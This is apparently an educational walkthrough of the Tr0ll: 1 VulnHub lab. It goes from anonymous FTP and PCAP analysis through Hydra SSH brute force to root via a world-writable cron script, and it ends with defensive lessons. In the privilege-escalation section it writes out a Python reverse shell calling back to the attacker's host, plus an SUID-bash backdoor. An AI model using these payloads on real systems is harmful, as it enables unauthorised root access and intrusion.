# Tr0ll: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an isolated lab network. **Only attack machines you own or are explicitly authorised to test.** This box deliberately trolls you — expect red herrings.

| Field | Value |
| --- | --- |
| **Machine** | Tr0ll: 1 |
| **Difficulty** | Easy / Beginner (boot2root) |
| **Author** | Maleus (@maleus21) |
| **Released** | 14 Aug 2014 |
| **VulnHub Entry** | [https://vulnhub.com/entry/tr0ll-1,100/](https://vulnhub.com/entry/tr0ll-1,100/) |
| **Download** | [https://vulnhub.com/entry/tr0ll-1,100/#download](https://vulnhub.com/entry/tr0ll-1,100/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Ubuntu Linux 14.04 (32-bit, kernel 3.13 — varies by build) |

---

## 0. What you will learn

- How to spot an **anonymous FTP** server and pull files from it.
- How to analyse a **PCAP** (network capture) in Wireshark to recover hidden names and passwords.
- How "hints" deliberately hidden in a web server lead to a username wordlist and a password.
- How to use **Hydra** to test a small credential list against SSH (and why rate-limiting matters).
- How a **world-writable script owned by root and run by cron** gives you root.

> **Fair warning from the author:** "Not for the easily frustrated! There be trolls ahead!" You will get disconnected every few minutes — this is normal. Capture what you need quickly.

**Prerequisites:** Kali Linux, plus `wireshark`, `hydra`, and `ftp` installed. See `docs/LAB-SETUP.md` and `docs/TOOLS.md`.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box is `192.168.56.10` on `192.168.56.0/24`, so the target shares the `192.168.56.` prefix.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   (Kali)
192.168.56.101  08:00:27:11:22:33   (target)
```

> **Why it works:** `arp-scan` sends ARP requests and lists every host that answers — no need for an open port.

**Target IP:** `192.168.56.101`

![finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```bash
sudo nmap -sC -sV -p21,22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0 0  8068 Aug 09 2014 lol.pcap [NSE: writeable]
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

> **How to read it:**
> - `-sC` runs Nmap's default scripts — here `ftp-anon` **already tells us anonymous FTP works** and that a `lol.pcap` file is present.
> - **21/ftp** — anonymous login allowed → grab files.
> - **22/ssh** — where we'll eventually log in.
> - **80/http** — Apache, our main puzzle surface.

![nmap service scan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Anonymous FTP → download the PCAP

```bash
ftp 192.168.56.101
```

```text
Name (192.168.56.101:kali): anonymous
Password:            <- just press Enter
230 Login successful.
ftp> ls
-rwxrwxrwx    1 0 0  8068 Aug 09 2014 lol.pcap
ftp> get lol.pcap
ftp> bye
```

> **Why it works:** `anonymous` is a built-in FTP account for public file drops. Here it hands out a network capture that contains clues.

### 3.2 Read the PCAP in Wireshark

```bash
wireshark lol.pcap &
```

In Wireshark, right-click a packet and choose **Follow → TCP Stream**, then step through each stream (`tcp.stream eq 0`, `eq 1`, …). Two contain the "secret":

```text
Stream 0:  ... secret_stuff.txt ...
Stream 1:  Well, well, well, aren't you just a clever little devil,
           you almost found the sup3rs3cr3tdirlol :-P
```

> **How to read it:** a PCAP records raw network traffic. Somebody transferred a note mentioning `secret_stuff.txt` and a directory called **`sup3rs3cr3tdirlol`**. (You can also shortcut this with `strings lol.pcap`.)

### 3.3 Follow the web trail

Try the leaked directory on the web server:

```bash
curl http://192.168.56.101/sup3rs3cr3tdirlol/
```

```text
Index of /sup3rs3cr3tdirlol
  roflmao
```

Download and inspect the `roflmao` binary:

```bash
wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
file roflmao
chmod +x roflmao && ./roflmao
```

```text
roflmao: ELF 32-bit LSB executable, Intel 80386, ...
Find address 0x0856BF to proceed
```

> **How to read it:** `file` tells us it's a Linux executable. Running it prints the hint **`0x0856BF`** — which, on this box, is another web path, not a memory address.

```bash
curl "http://192.168.56.101/0x0856BF/"
```

```text
Index of /0x0856BF
  good_luck/
  this_folder_contains_the_password/
```

Grab both files:

```bash
curl http://192.168.56.101/0x0856BF/good_luck/which_one_lol.txt
curl http://192.168.56.101/0x0856BF/this_folder_contains_the_password/Pass.txt
```

```text
which_one_lol.txt:
  male-us
  ps-aux
  felux
  Eagle11
  genphlux   <-- Definitely not this one
  usmc8892
  blawrg
  wytshadow
  vis1t0r
  overflow

Pass.txt:
  Good_job_:)
```

> **How to read it:** `which_one_lol.txt` is a **username list** with a fake "definitely not this one" troll. `Pass.txt` looks like a password (`Good_job_:)`), but the *real* password is the **filename itself**: `Pass.txt`. The winning pair is `overflow:Pass.txt`.

### 3.4 Brute force SSH with Hydra (small, slow list)

```bash
cat > users.txt <<'EOF'
male-us
ps-aux
felux
Eagle11
genphlux
usmc8892
blawrg
wytshadow
vis1t0r
overflow
EOF
printf 'Pass.txt\nGood_job_:)\n' > pass.txt
```

```bash
hydra -L users.txt -P pass.txt ssh://192.168.56.101 -t 4 -V
```

```text
[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt
```

> **How to read it:**
> - `-L` = username list, `-P` = password list, `-t 4` = only 4 parallel tries (the box **rate-limits and bans you** if you hammer it — that's the troll).
> - It found `overflow` / `Pass.txt`.

Log in:

```bash
ssh overflow@192.168.56.101
```

```text
overflow@192.168.56.101's password: Pass.txt
...
Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

> **Why it works:** the filename-as-password trick plus a real account = shell. Note the missing home directory and the fact that **you get kicked every ~5 minutes** (a cron job `/opt/lmao.py` logs you out on purpose).

![foothold via SSH as overflow](images/04-foothold.png)

> **Note:** Tr0ll has no `user.txt`; the goal is root's `proof.txt`, so continue to privesc.

---

## 4. Privilege escalation — becoming root

### 4.1 Find world-writable files owned by root

```bash
find / -perm -o+w -type f 2>/dev/null | grep -v /proc
```

```text
/srv/ftp/lol.pcap
/var/tmp/cleaner.py.swp
/var/www/html/sup3rs3cr3tdirlol/roflmao
/var/log/cronlog
/lib/log/cleaner.py
```

> **How to read it:** `-perm -o+w` finds files that **everyone can write to**. A world-writable file **owned by root** is a backdoor waiting to happen. `/lib/log/cleaner.py` stands out.

### 4.2 Confirm it runs as root via cron

```bash
cat /lib/log/cleaner.py
cat /var/log/cronlog
ls -la /lib/log/cleaner.py
```

```text
# /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()

# /var/log/cronlog
*/2 * * * * cleaner.py

# -rwxrwxrwx 1 root root 96 Aug 13 2014 /lib/log/cleaner.py
```

> **How to read it:**
> - The script just deletes everything in `/tmp`.
> - `cronlog` shows it is scheduled every 2 minutes (`*/2`), and `-rwxrwxrwx 1 root root` shows **root owns it but everyone can write it**.
> - Therefore: whatever we put in `cleaner.py` runs **as root within ~2 minutes**.

### 4.3 Hijack the script

Overwrite `cleaner.py` with a reverse shell that calls back to Kali. First start a listener:

```bash
# On Kali — separate terminal
nc -lvnp 4444
```

```bash
# On the target — replace the cleanup script
cat > /lib/log/cleaner.py <<'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.10",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
```

Wait up to 2 minutes. Back on your listener:

```text
listening on [any] 4444 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44BE
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** cron executes `cleaner.py` as root; because we could write to it, our code ran as root. We now have a root shell.

> **Alternative (SUID shell):** instead of a reverse shell, make the script copy `/bin/sh` and set the SUID bit, then wait for cron:
> ```bash
> cat > /lib/log/cleaner.py <<'EOF'
> import os
> os.system('rm -f /tmp/rootsh; cp /bin/bash /tmp/rootsh; chmod 4755 /tmp/rootsh')
> EOF
> ```
> After ~2 minutes run `/tmp/rootsh -p` to get a root shell.

> **Also viable:** the old 3.13 kernel is vulnerable to OverlayFS (`CVE-2015-1328`) and Dirty COW (`CVE-2016-5195`) local privilege escalation, but the writable-cron path is the intended one.

### 4.4 The root flag

```bash
cd /root
ls -la
cat /root/proof.txt
```

```text
Good job, you did it! 702a8c18d29c6f3ca0d99ef5712bfbdc
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP enabled | `vsftpd` on port 21 | Attacker downloads internal files (`lol.pcap`) |
| 2 | Sensitive data in a network capture | `lol.pcap` | Leaks hidden directory names / hints |
| 3 | Directory listing + info disclosure | Apache `/sup3rs3cr3tdirlol/`, `/0x0856BF/` | Reveals hidden paths, username list and password |
| 4 | Weak/predictable credentials | SSH (`overflow:Pass.txt`) | Initial shell |
| 5 | World-writable root-owned script run by cron | `/lib/log/cleaner.py` (`*/2 * * * *`) | Local user runs arbitrary code as root |
| 6 | Unpatched kernel (bonus) | kernel 3.13 (OverlayFS / Dirty COW) | Alternative local root escalation |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** unless you truly need a public drop, and never store sensitive captures there.
- **Never leave sensitive data in plaintext on disk or in packet captures**; treat PCAPs as confidential.
- **Turn off Apache directory listings** (`Options -Indexes`) and don't place credential lists in the web root.
- **Enforce strong, unique passwords**; filenames and "cute" phrases are not passwords. Add SSH rate-limiting/lockouts.
- **Fix file permissions.** Root-owned scripts must not be world-writable (use `chmod 755` and root-only ownership). Prefer running cron jobs as an unprivileged service account.
- **Patch the kernel** so local priv-esc exploits (OverlayFS, Dirty COW) don't work.
- **Detections:** monitor for changes to files under `/etc/cron*`, `/var/spool/cron`, and any root-owned script; alert on unexpected outbound connections (reverse shells) and on processes with `euid=0` started from world-writable files.

---

## 7. References

- VulnHub entry: [https://vulnhub.com/entry/tr0ll-1,100/](https://vulnhub.com/entry/tr0ll-1,100/)
- Community writeups consulted:
  - [sw1tch — Walkthrough for Tr0ll: 1](https://www.sw1tch.net/20140816_01.html)
  - [NetOSec — Tr0ll 1 vulnhub walkthrough](https://netosec.com/tr0ll-1-vulnhub-walkthrough/)
  - [Ivan Daňo (Medium) — Tr0ll 1 Writeup](https://medium.com/@ivandano77/tr0ll-1-writeup-vulnhub-beginner-machine-877f118310f7)
  - [ziomsec — Troll 1 Writeup](https://ziomsec.com/writeups/vulnhub/troll-1/)
  - [dieSec — WriteUp Tr0ll 1](https://diesec.home.blog/2020/03/15/writeup-tr0ll-1/)
- Tool technique references:
  - [GTFOBins](https://gtfobins.github.io/)
  - [Exploit-DB 37292 — OverlayFS Local Privilege Escalation (CVE-2015-1328)](https://www.exploit-db.com/exploits/37292)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan (21/22/80) with `ftp-anon`
- [ ] `images/03-enum.png` — the `0x0856BF` directory with username/password files
- [ ] `images/04-foothold.png` — Hydra + SSH login as `overflow`
- [ ] `images/05-shell.png` — the `overflow` shell
- [ ] `images/06-user-flag.png` — (no user flag on this box — note it)
- [ ] `images/07-privesc.png` — world-writable `/lib/log/cleaner.py` and cron
- [ ] `images/08-root-flag.png` — `/root/proof.txt`

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
